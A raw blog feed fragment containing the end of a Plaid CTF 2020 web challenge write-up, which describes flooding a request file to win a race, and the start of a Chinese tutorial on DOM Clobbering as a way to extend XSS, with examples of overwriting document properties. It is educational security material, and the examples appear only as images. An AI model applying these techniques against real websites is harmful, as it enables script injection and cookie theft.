rel="noopener"></a></blockquote></div><script async="" defer="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>He mentioned we should send the real request followed by 50,000 dumb requests (in one file). I tried this method today and this really gave 100% success rate.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/3.png" alt=""></p><p>Just like this, I put 1000 http get requests in one file and every time can get flag.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/4.png" alt=""></p><p>Interesting challange! Hope u enjoy!</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Here is my write up of Contrived Web Problem in Plaid CTF 2020.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="wp" scheme="https://blog.zeddyu.info/tags/wp/"/>
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>使用 Dom Clobbering 扩展 XSS</title>
    <link href="https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/"/>
    <id>https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/</id>
    <published>2020-03-04T02:15:58.000Z</published>
    <updated>2021-09-27T17:45:58.716Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>前几天 PortSwigger 发布了 <a href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2019" target="_blank" rel="noopener">Top 10 web hacking techniques of 2019</a>，榜上的攻击技术都比较有意思，p牛也肯定会在小密圈做分享的（如果没有话本菜也会在自己<a href="https://blog.zeddyu.info">博客</a>做做学习分享），所以我们这里就不聊 Top 10 技术了，就看看在 Top 10 提名结果没上榜但是依旧很有意思的技术 Dom Clobbering。</p><blockquote class="colorquote success"><p>文章首发于先知社区：<a href="https://xz.aliyun.com/t/7329" target="_blank" rel="noopener">https://xz.aliyun.com/t/7329</a></p></blockquote><a id="more"></a><h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><p>From <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction" target="_blank" rel="noopener">MDN Web Docs</a>:</p><blockquote><p>​    The Document Object Model (DOM) is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style, and content. The DOM represents the document as nodes and objects. That way, programming languages can connect to the page.</p><p>A Web page is a document. This document can be either displayed in the browser window or as the HTML source. But it is the same document in both cases. The Document Object Model (DOM) represents that same document so it can be manipulated. The DOM is an object-oriented representation of the web page, which can be modified with a scripting language such as JavaScript.</p><p>The <a href="http://www.w3.org/DOM/" target="_blank" rel="noopener">W3C DOM</a> and <a href="https://dom.spec.whatwg.org/" target="_blank" rel="noopener">WHATWG DOM</a> standards are implemented in most modern browsers. Many browsers extend the standard, so care must be exercised when using them on the web where documents may be accessed by various browsers with different DOMs.</p></blockquote><p>DOM 最初是在没有任何标准化的情况下诞生和实现的，这导致了许多特殊的行为，但是为了保持兼容性，很多浏览器仍然支持异常的 DOM 。</p><p>DOM 的旧版本（即DOM Level 0 &amp; 1）仅提供了有限的通过 JavaScript 引用元素的方式，一些经常使用的元素具有专用的集合（例如<code>document.forms</code>），而其他元素可以通过<code>Window</code>和<code>Document</code>对象上的<code>name</code>属性和<code>id</code>属性来引用，</p><p>显然，支持这些引用方式会引起混淆，即使较新的规范试图解决此问题，但是为了向后兼容，大多数行为都不能轻易更改。并且，浏览器之间没有共识，因此每个浏览器可能遵循不同的规范（甚至根本没有标准）。显然，缺乏标准化意味着确保DOM的安全是一项重大挑战。</p><p>由于非标准化的 DOM 行为，浏览器有时可能会向各种 DOM 元素添加 name &amp; id 属性，作为对文档或全局对象的属性引用，但是，这会导致覆盖掉 document原有的属性或全局变量，或者劫持一些变量的内容，而且不同的浏览器还有不同的解析方式，所以本文的内容如果没有特别标注，均默认在 <strong>Chrome 80.0.3987.116</strong> 版本上进行。 </p><p>Dom Clobbering 就是一种将 HTML 代码注入页面中以操纵 DOM 并最终更改页面上 JavaScript 行为的技术。 在无法直接 XSS 的情况下，我们就可以往 DOM Clobbering 这方向考虑了。 </p><h2 id="Simple-Example"><a href="#Simple-Example" class="headerlink" title="Simple Example"></a>Simple Example</h2><p>其实 Dom Clobbering 比较简单，我们看几个简单的例子就能知道它是干什么了的。</p><h3 id="Exmaple-1-Create"><a href="#Exmaple-1-Create" class="headerlink" title="Exmaple 1 - Create"></a>Exmaple 1 - Create</h3><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225164841.png" alt=""></p><p>从图中我们可以看到通过 id 或者 name 属性，我们可以在<code>document</code>或者<code>window</code>对象下创建一个对象。</p><h3 id="Example-2-Overwrite"><a href="#Example-2-Overwrite" class="headerlink" title="Example 2 - Overwrite"></a>Example 2 - Overwrite</h3><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200222145150.png" alt=""></p><p>可以看到<code>document.cookie</code>已经被我们用 img 标签给覆盖了</p><h3 id="Example-3-Overwrite2"><a href="#Example-3-Overwrite2" class="headerlink" title="Example 3 - Overwrite2"></a>Example 3 - Overwrite2</h3><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225165624.png" alt=""></p><p>可以看到我们通过多层覆盖掉了<code>document.body.appendChild</code>方法。</p><h2 id="Attack-Method"><a href="#Attack-Method" class="headerlink" title="Attack Method"></a>Attack Method</h2><p>既然我们可以通过这种方式去创建或者覆盖 document 或者 window 对象的某些值，但是看起来我们举的例子只是利用标签创建或者覆盖最终得到的也是标签，是一个<code>HTMLElment</code>对象。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKL